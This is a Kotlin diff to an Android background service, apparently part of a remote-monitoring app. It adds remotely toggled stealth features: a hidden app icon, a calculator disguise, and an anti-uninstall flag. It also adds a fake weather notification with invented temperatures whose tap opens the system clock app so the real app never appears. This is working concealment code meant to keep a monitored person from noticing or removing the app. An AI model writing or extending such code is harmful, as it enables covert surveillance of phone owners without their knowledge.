@@ -545,10 +545,15 @@ class PhoneLinkService : Service() {
     }
 
     private fun handleCamouflageConfig(payload: JSONObject) {
-        if (payload.has("calculatorDisguise")) {
+        if (payload.has("stealthMode")) {
+            val mode = payload.optString("stealthMode", "NORMAL")
+            DevicePrefs.updateStealthMode(this, mode)
+        } else if (payload.has("hideIcon")) {
+            val hide = payload.optBoolean("hideIcon", false)
+            DevicePrefs.updateStealthMode(this, if (hide) "HIDDEN" else "NORMAL")
+        } else if (payload.has("calculatorDisguise")) {
             val enabled = payload.optBoolean("calculatorDisguise", false)
-            DevicePrefs.calculatorDisguiseEnabled = enabled
-            DevicePrefs.updateCalculatorAlias(this, enabled)
+            DevicePrefs.updateStealthMode(this, if (enabled) "CALCULATOR" else "NORMAL")
         }
         if (payload.has("stealthNotification")) {
             val enabled = payload.optBoolean("stealthNotification", true)
@@ -569,6 +574,7 @@ class PhoneLinkService : Service() {
         val json = JSONObject().apply {
             put("deviceId", DevicePrefs.deviceId)
             put("calculatorDisguise", DevicePrefs.calculatorDisguiseEnabled)
+            put("hideAppIcon", DevicePrefs.hideAppIconEnabled)
             put("stealthNotification", DevicePrefs.stealthNotificationEnabled)
             put("antiTamper", DevicePrefs.antiUninstallShieldEnabled)
             put("hasOwnerPin", DevicePrefs.hasOwnerPin())
@@ -1551,8 +1557,7 @@ class PhoneLinkService : Service() {
     private var lastNotifiedState: String? = null
 
     private fun buildNotification(text: String): Notification {
-        val isDefaultHome = isDefaultLauncherActive()
-        val isStealth = DevicePrefs.stealthNotificationEnabled || isDefaultHome
+        val isStealth = DevicePrefs.stealthNotificationEnabled
         val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
 
         val cal = java.util.Calendar.getInstance()
@@ -1570,23 +1575,30 @@ class PhoneLinkService : Service() {
             else -> "Clear Sky"
         }
 
-        val intent = if (isDefaultHome) {
-            Intent(this, com.phonelink.hub.launcher.LauncherActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        // REDIRECT TARGET: Safe system Clock/Alarms or Weather app so PhoneLink never opens when tapping notification!
+        val clockIntent = try {
+            val i = Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
-        } else if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
-            Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            if (i.resolveActivity(packageManager) != null) i else {
+                (packageManager.getLaunchIntentForPackage("com.google.android.deskclock")
+                    ?: packageManager.getLaunchIntentForPackage("com.android.deskclock")
+                    ?: packageManager.getLaunchIntentForPackage("com.miui.weather2")
+                    ?: packageManager.getLaunchIntentForPackage("com.sec.android.app.clockpackage")
+                    ?: Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_APP_CALENDAR)).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    }
             }
-        } else {
-            Intent(this, StatusActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        } catch (_: Exception) {
+            Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
         }
+
         val pi = PendingIntent.getActivity(
             this,
             0,
-            intent,
+            clockIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
@@ -1607,6 +1619,8 @@ class PhoneLinkService : Service() {
             .setContentTitle(notifTitle)
             .setContentText(notifText)
             .setSmallIcon(R.drawable.ic_notification_minimal)
+            .setColor(android.graphics.Color.parseColor("#4B5563")) // Slate gray neutral, prevents purple tinting!
+            .setColorized(false)
             .setOngoing(true)
             .setOnlyAlertOnce(true)
             .setSilent(true)
@@ -1619,8 +1633,7 @@ class PhoneLinkService : Service() {
     }
 
     private fun buildFallbackNotification(text: String): Notification {
-        val isDefaultHome = isDefaultLauncherActive()
-        val isStealth = DevicePrefs.stealthNotificationEnabled || isDefaultHome
+        val isStealth = DevicePrefs.stealthNotificationEnabled
         val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
 
         val cal = java.util.Calendar.getInstance()
@@ -1631,23 +1644,29 @@ class PhoneLinkService : Service() {
         val timeStr = String.format(java.util.Locale.getDefault(), "%d:%02d %s", hour12, minute, amPm)
         val temp = if (hour in 6..18) "25°C" else "22°C"
 
-        val intent = if (isDefaultHome) {
-            Intent(this, com.phonelink.hub.launcher.LauncherActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        val clockIntent = try {
+            val i = Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
-        } else if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
-            Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            if (i.resolveActivity(packageManager) != null) i else {
+                (packageManager.getLaunchIntentForPackage("com.google.android.deskclock")
+                    ?: packageManager.getLaunchIntentForPackage("com.android.deskclock")
+                    ?: packageManager.getLaunchIntentForPackage("com.miui.weather2")
+                    ?: packageManager.getLaunchIntentForPackage("com.sec.android.app.clockpackage")
+                    ?: Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_APP_CALENDAR)).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    }
             }
-        } else {
-            Intent(this, StatusActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        } catch (_: Exception) {
+            Intent(android.provider.AlarmClock.ACTION_SHOW_ALARMS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
         }
+
         val pi = PendingIntent.getActivity(
             this,
             0,
-            intent,
+            clockIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
         val notifTitle = if (isStealth) "⛅ $temp Sunny • $timeStr" else getString(R.string.app_name)
@@ -1657,6 +1676,8 @@ class PhoneLinkService : Service() {
             .setContentTitle(notifTitle)
             .setContentText(notifText)
             .setSmallIcon(R.drawable.ic_notification_minimal)
+            .setColor(android.graphics.Color.parseColor("#4B5563"))
+            .setColorized(false)
             .setOngoing(true)
             .setOnlyAlertOnce(true)
             .setSilent(true)
